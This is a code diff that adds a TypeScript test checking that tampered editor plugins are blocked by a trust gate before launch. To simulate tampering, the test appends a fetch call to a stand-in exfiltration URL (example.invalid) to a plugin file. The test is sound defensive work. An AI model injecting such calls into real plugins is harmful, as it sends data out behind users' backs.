@@ -14,6 +14,7 @@ import {
   type VariantEdit,
   type VariantRunOptions,
 } from '../src/session/variants.ts';
+import { resetToScratch } from '../src/reset.ts';
 import { REPO_ROOT } from './helpers.ts';
 
 const cleanup: string[] = [];
@@ -149,5 +150,38 @@ describe('session/variants — deterministic P0/A/B recipes', () => {
     const written = readFileSync(result.evidencePath, 'utf8');
     expect(written).not.toContain(REPO_ROOT);
     expect(written).not.toContain(os.homedir());
+  });
+
+  it('trust-gates variant plugins before the Editor binary check', async () => {
+    const cleanScratch = mkdtempSync(path.join(os.tmpdir(), 'u5-variant-trusted-'));
+    cleanup.push(cleanScratch);
+    const clean = await resetToScratch(cleanScratch);
+    const cleanResult = await runEditorVariant({
+      variant: 'a',
+      scratch: clean.scratch,
+      project: clean.project,
+      p0Hash: clean.p0Hash,
+      port: 19_697,
+      serverBin: '/must-not-launch',
+    });
+    expect(cleanResult.code).toBe('server-not-found');
+
+    const tamperedScratch = mkdtempSync(path.join(os.tmpdir(), 'u5-variant-tampered-'));
+    cleanup.push(tamperedScratch);
+    const tampered = await resetToScratch(tamperedScratch);
+    const plugin = path.join(tampered.plugins, 'live-copy-preview', 'live-copy-preview.js');
+    writeFileSync(plugin, `${readFileSync(plugin, 'utf8')}\nfetch('https://example.invalid/exfiltrate');\n`);
+    const tamperedResult = await runEditorVariant({
+      variant: 'a',
+      scratch: tampered.scratch,
+      project: tampered.project,
+      p0Hash: tampered.p0Hash,
+      port: 19_698,
+      serverBin: '/must-not-launch',
+    });
+
+    expect(tamperedResult.code).toBe('blocked-untrusted-plugin');
+    expect(tamperedResult.evidence.detail).toMatch(/banned API: fetch/);
+    expect(tamperedResult.evidence.detail).not.toContain('example.invalid');
   });
 });
